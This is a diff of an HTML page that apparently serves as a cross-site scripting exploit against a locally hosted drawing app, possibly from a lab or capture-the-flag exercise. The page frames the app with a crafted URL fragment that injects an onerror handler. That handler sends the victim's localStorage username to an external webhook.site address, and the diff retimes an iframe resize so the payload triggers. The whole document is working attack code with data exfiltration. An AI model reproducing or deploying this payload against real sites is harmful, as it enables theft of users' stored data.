@@ -4,13 +4,21 @@
   <iframe id="i" width="300" height="300" src=""></iframe>
   <script>
     var i = document.querySelector("#i");
-    setTimeout(() => { i.width = 1000; }, 1000);
     var base = "https://webhook.site/bdfce11f-cd6b-461c-b1df-e538fdca65ff";
     fetch(base + "?stage=start", {mode:'no-cors'});
+    
     i.src = "http://localhost:4000/drawing/abcd#src=1&onerror="
       + encodeURIComponent("fetch('"+base+"?stage=xss&c='+encodeURIComponent(localStorage.username),{mode:'no-cors'})")
       + "&is";
-    setTimeout(()=>{fetch(base+"?stage=after_resize",{mode:'no-cors'})},1500);
+
+    // Wait longer for React to fully render with narrow viewport
+    setTimeout(() => {
+      fetch(base + "?stage=before_resize", {mode:'no-cors'});
+      i.width = 1000;
+      // Also dispatch resize event inside iframe
+      try { i.contentWindow.dispatchEvent(new Event('resize')); } catch(e) {}
+      fetch(base + "?stage=after_resize", {mode:'no-cors'});
+    }, 2500);
   </script>
 </body>
 </html>
